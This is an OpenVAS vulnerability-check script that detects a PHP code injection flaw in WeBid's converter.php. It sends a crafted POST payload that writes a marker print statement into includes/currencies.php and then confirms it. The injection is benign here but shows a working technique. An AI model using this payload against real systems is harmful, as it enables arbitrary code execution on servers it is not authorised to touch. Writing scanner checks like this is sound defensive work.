###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_webid_48554.nasl 13 2013-10-27 12:16:33Z jan $
#
# WeBid 'converter.php' Multiple Remote PHP Code Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_solution = "Updates are available. Please see the references for more information.


*** You should remove the line 'array('from' => 'USD', 'to' => '^@'));print('openvas-c-i-test'//', 'rate' => '')' from includes/currencies.php ***";

tag_summary = "WeBid is prone to multiple vulnerabilities that attackers can leverage
to execute arbitrary PHP code because the application fails to
adequately sanitize user-supplied input.

Successful attacks can compromise the affected application and
possibly the underlying computer.

WeBid 1.0.2 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103186";
CPE = "cpe:/a:webidsupport:webid";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-07-06 13:49:20 +0200 (Wed, 06 Jul 2011)");
 script_bugtraq_id(48554);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("WeBid 'converter.php' Multiple Remote PHP Code Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/48554");
 script_xref(name : "URL" , value : "http://www.webidsupport.com/forums/showthread.php?3892");
 script_xref(name : "URL" , value : "http://www.webidsupport.com");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if WeBid is prone to Remote PHP Code Injection Vulnerabilities");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("gb_webid_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("webid/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
   script_tag(name : "solution" , value : tag_solution);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if( ! get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

url = string(dir,"/converter.php");

postdata = string("action=convert&from=USD&to=%00%27%29%29%3Bprint%28%27openvas-c-i-test%27%2F%2F");

 req = string(
            "POST ", url, " HTTP/1.1\r\n",
            "Host: ", get_host_name(), "\r\n",
            "Content-Type: application/x-www-form-urlencoded\r\n",
            "Content-Length: ", strlen(postdata), "\r\n",
            "\r\n",
            postdata
    );

res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

url = string(dir, "/includes/currencies.php");
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("openvas-c-i-test" >< buf) {
  security_hole(port:port);
  exit(0);
}  

exit(0);
